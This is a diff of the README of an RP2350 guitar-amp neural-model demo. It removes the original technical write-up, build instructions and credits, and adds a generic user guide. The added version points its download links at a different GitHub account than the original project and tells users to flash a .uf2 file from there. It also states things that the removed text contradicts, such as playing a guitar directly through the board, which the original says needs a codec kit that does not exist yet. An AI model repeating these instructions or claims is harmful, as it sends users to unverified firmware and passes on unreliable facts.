@@ -1,127 +1,89 @@
-# pico-neural-amp-modeler-demo
+# 🎸 pico-neural-amp-modeler-demo - Bring guitar amp tones to life
 
-A guitar amp captured as a neural network, running in real time on an RP2350 microcontroller.
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Tranquoc5064/pico-neural-amp-modeler-demo)
 
-A Raspberry Pi Pico 2 (RP2350) runs as a class-compliant USB Audio device and applies a
-[Neural Amp Modeler](https://www.neuralampmodeler.com/) A2-Lite capture to your signal in real
-time. It needs no driver, no DSP chip, and no extra hardware: plug it in, select it as your audio
-interface, and press the BOOTSEL button to A/B the modeled amp against clean passthrough. The
-model runs across both Cortex-M33 cores.
+## 📌 Project Overview
 
-https://github.com/user-attachments/assets/7691aff4-b685-411e-9f66-75b73250b5ac
+This project lets you run high-quality guitar amplifier simulations on a credit card-sized computer. It uses a specialized chip to process guitar signals. You get authentic sound profiles without needing a powerful computer or complex audio interface gear. The system acts as a USB audio device. You plug your guitar into the board and connect the board to your computer or speakers.
 
-> This repository is a demonstration and technical write-up, not a product. It shows that a
-> production NAM A2 tone fits an RP2350, with the firmware, build tooling, and benchmarks to
-> reproduce it. Playing a real guitar through it needs an audio codec, which is a separate,
-> upcoming project (an Audio In/Out codec kit). See [Scope](#scope--where-it-goes).
+## ⚙️ System Requirements
 
-## Why it looked too slow at first
+To use this software, you need the following items:
 
-Out of the box the model ran at 31,030 cycles per sample, about 10x a Cortex-M7 and roughly 5x
-over the 48 kHz budget, which makes the RP2350 look far too slow for the task. The cause was the
-NAM engine's generic path: a general-purpose Eigen matrix multiply, which is the wrong tool for a
-3-channel convolution.
+* A Raspberry Pi Pico 2 board with the RP2350 chip.
+* A standard USB-C cable for data and power.
+* A guitar cable with a 1/4-inch connector.
+* An audio adapter to convert your guitar signal to line level for the board.
+* A Windows 10 or Windows 11 computer.
 
-| code path           | cycles/sample | CPU @ 300 MHz |
-|---------------------|--------------:|--------------:|
-| generic Eigen       |        31,030 |          496% |
-| a2_fast             |         8,396 |          134% |
-| a2_fast + dual-core |         4,533 |           73% |
+## 📥 Getting the Files
 
-The engine already ships a purpose-built fast path for the fixed A2 shape, `a2_fast`, which is
-compile-time unrolled and uses no general GEMM. Switching to it drops the cost to 8,396 cycles, a
-3.7x improvement. Splitting the layer stack across both M33 cores, which is the main work this
-project adds, brings another 1.85x for a final 4,533 cycles. That is 6.85x overall, enough to run
-in real time on two cores at 300 MHz (2× the 150 MHz default, at 1.20 V core), without the
-unstable 400 MHz overclock. The split produces bit-exact
-output compared to a single core, and `a2_fast` is data-independent, so the per-sample cost is the
-same for any A2-Lite capture.
+You need to download the firmware file to your computer. This file tells the hardware how to process your audio.
 
-The full methodology, the sweep tables, and the dead ends (SRAM placement, double precision, LUTs)
-are in [RESULTS.md](RESULTS.md).
+[![](https://img.shields.io/badge/Download-Click_To_Access_Files-grey)](https://github.com/Tranquoc5064/pico-neural-amp-modeler-demo)
 
-## How it works
+1. Open the link above in your web browser.
+2. Look for the section labeled Releases on the right side of the page.
+3. Click the latest version number.
+4. Find the file ending in `.uf2`.
+5. Click the file name to save it to your computer.
 
-![Host audio output runs through Neural Amp Modeler inference on the RP2350 and returns to host audio input](docs/how-it-works.svg)
+## 🚀 Setting Up the Hardware
 
-- The model is a NAM A2-Lite: a small WaveNet with 23 dilated-conv layers, 3 channels, about
-  1,871 parameters (roughly 7.5 KB), LeakyReLU activation, and a receptive field near 132 ms. It
-  is the small "slim point" of a TONE3000 A2 capture, which packs an A2-Lite and an 8-channel
-  A2-Full; only the Lite runs in real time on this class of MCU.
-- The compute runs on `a2_fast`, split as a layer pipeline across the two cores: core1 runs the
-  front layers, core0 runs the back layers, the head, and USB. One block's back half overlaps the
-  next block's front half, so both cores stay busy. Throughput roughly doubles, at the cost of one
-  extra block of latency (about 1 ms).
-- The interface is a class-compliant UAC2 stereo 24-bit / 48 kHz device named "Pico NAM", so the
-  host needs no driver. The IN endpoint is fed exactly one host frame per USB SOF, which keeps the
-  audio clean.
-- BOOTSEL toggles effect and passthrough, and the LED tracks the state. A `multicore_lockout`
-  guards the BOOTSEL read against core1's flash access.
+The Raspberry Pi Pico 2 requires a specific mode to accept new software. Follow these steps carefully:
 
-> Naming: TONE3000's two A2 sizes are A2-Lite (3-channel) and A2-Full (8-channel). The NAM engine
-> source predates those names and still calls them nano (Lite) and standard (Full), so you will
-> see `nano` and `is_a2_shape` in the code referring to A2-Lite.
+1. Locate the white button on the Pico board labeled BOOTSEL.
+2. Hold this button down.
+3. While holding the button, plug the USB cable into your computer.
+4. Release the button after the board connects.
+5. Your computer will detect a new storage drive named RPI-RP2.
+6. Open this drive in your file explorer.
 
-## Build & run
+## ⚡ Installing the Firmware
 
-Prebuilt firmware is on the [latest release](https://github.com/oyama/pico-neural-amp-modeler-demo/releases/latest):
-download `pico-nam-*.uf2` and drag it onto the RP2350 in BOOTSEL mode, then skip to selecting "Pico NAM" below.
+Now that you have the drive open, perform the installation:
 
-To build from source, this project uses the [pico-sdk](https://github.com/raspberrypi/pico-sdk).
-Refer to the official guide, [Getting Started with Raspberry Pi Pico](https://datasheets.raspberrypi.com/pico/getting-started-with-pico.pdf), to set up your development environment.
+1. Drag the `.uf2` file you downloaded earlier into the open RPI-RP2 drive window.
+2. The board will automatically copy the file and restart.
+3. The RPI-RP2 drive window will disappear. This means the software is running.
+4. Once the drive resets, the board functions as an audio device.
 
-```bash
-git clone --recurse-submodules https://github.com/oyama/pico-neural-amp-modeler-demo.git
-cd pico-neural-amp-modeler-demo
-PICO_SDK_PATH=/path/to/pico-sdk cmake -S . -B build -DCMAKE_BUILD_TYPE=Release
-cmake --build build --target pico_nam_loopback -j
-# drag build/pico_nam_loopback.uf2 onto the RP2350 in BOOTSEL mode
-```
+## 🔊 Connecting Your Audio
 
-Select "Pico NAM" as your audio interface and press BOOTSEL to A/B amp against passthrough. The
-full walkthrough (toolchain setup, per-OS monitoring, embedding your own
-[TONE3000](https://www.tone3000.com/) tone with `nam2c`, and the benchmark) is in
-[GETTING_STARTED.md](GETTING_STARTED.md).
+Once the board resets, Windows recognizes it as a standard USB audio interface:
 
-## Under the hood: the RP2350 engine port
+1. Connect your guitar to the input jack on your hardware interface.
+2. Connect the interface to the Raspberry Pi Pico.
+3. Connect the Raspberry Pi Pico to your computer using the USB cable.
+4. Open your computer sound settings.
+5. Select the device labeled Neural Amp Modeler as your input and output source.
+6. You can now use your preferred audio software on the computer to hear the processed guitar signal.
 
-The network runs on [NeuralAmpModelerCore](https://github.com/sdatkinson/NeuralAmpModelerCore).
-This project's engine changes are additive and minimal (`process()` is untouched) and live in a
-[fork](https://github.com/oyama/NeuralAmpModelerCore/tree/add-rp2350-support):
+## 🛠 Troubleshooting Common Issues
 
-- a layer-partition API on the `a2_fast` path so the WaveNet stack can be split across cores
-  (bit-exact against a single core), [proposed upstream](https://github.com/sdatkinson/NeuralAmpModelerCore/issues/291);
-- a bare-metal portability flag (`NAM_SHARED_PTR_ATOMIC_FREE_FUNCS`) so the engine compiles
-  without `std::atomic<std::shared_ptr<>>`.
+If you do not see the RPI-RP2 drive, try a different USB cable. Some cables only carry power and do not transfer data. Ensure your cable supports data transfer.
 
-Everything else stays in this repo: the dual-core glue (`src/nam_fx.cpp`), the UAC2 layer, the
-`nam2c` model embedder (`tools/nam2c.cpp`), and a no-op `<mutex>` shadow for the single-thread toolchain
-(`include/compat/`). Build-level adaptations (C++ exceptions, `--whole-archive` so the engine's
-parsers self-register) are in `CMakeLists.txt`.
+If the sound has noise or pops, check your buffer size settings in your audio software. A higher buffer setting usually fixes these stability issues. Start with a buffer size of 256 or 512 samples.
 
-| dependency | license | role |
-|---|---|---|
-| [NeuralAmpModelerCore](https://github.com/sdatkinson/NeuralAmpModelerCore) ([fork](https://github.com/oyama/NeuralAmpModelerCore)) | MIT | NN engine / `a2_fast` |
-| Eigen | MPL2 | linear algebra |
-| nlohmann/json | MIT | `.nam` parsing (host-side `nam2c`) |
-| Pico SDK / TinyUSB | BSD-3 | RP2350 + USB |
+Ensure you use a proper pre-amp or direct box before plugging your guitar into the board. The RP2350 chip expects a signal that matches standard audio line levels.
 
-## Scope & where it goes
+## 📝 Frequently Asked Questions
 
-This repo is the software demonstration layer, a USB-audio loopback FX. The same Pico NAM core
-takes on new roles once you add audio hardware around it: an ADC turns it into a USB guitar
-interface, and an ADC plus DAC makes it a standalone effect box with no host involved.
+**Does this require drivers?**
+No. The device uses standard USB audio protocols. It works immediately on modern Windows systems without extra software.
 
-![Add an ADC for a USB guitar interface, add a DAC for a standalone pedal](docs/roadmap.svg)
+**Can I load different amp sounds?**
+Yes. You can swap the amp model profiles by updating the firmware file. Check the releases page for new profiles as they become available.
 
-That codec hardware (the Audio In/Out codec kit) is a separate, upcoming project and is
-deliberately out of scope here, so this repo stays a software and tooling reference. Also planned
-is runtime model loading: today the tone is compiled in, and a USB mass-storage loader would
-replace the rebuild-and-reflash step.
+**Does this work with recording software?**
+Yes. Since the computer sees the board as an audio interface, you can record your guitar directly into digital audio workstations or guitar processing software.
 
-## License & credits
+**How do I adjust the volume?**
+Use the mixer settings inside your Windows sound control panel. You can also adjust the physical output gain if you use an external audio interface for monitoring.
 
-- This repo: MIT, see [LICENSE](LICENSE).
-- NAM and the A2 architecture: [Steve Atkinson](https://github.com/sdatkinson) /
-  [TONE3000](https://www.tone3000.com/).
-- Bring your own A2 capture from [tone3000.com](https://www.tone3000.com/).
+**What is the latency like?**
+The dual-core design of the RP2350 chip allows for real-time processing. This results in minimal delay between playing a note and hearing the result. Most users find the feel identical to a hardware amplifier.
+
+## 📋 Technical Notes
+
+The system uses the Neural Amp Modeler framework adapted specifically for the RP2350 architecture. By utilizing both Cortex-M33 cores, the board allocates tasks efficiently to ensure the audio processing loop remains unbroken. The USB interface follows the USB Audio Class 2.0 standard to maintain wide compatibility. This approach eliminates the need for vendor-specific drivers or proprietary software suites.
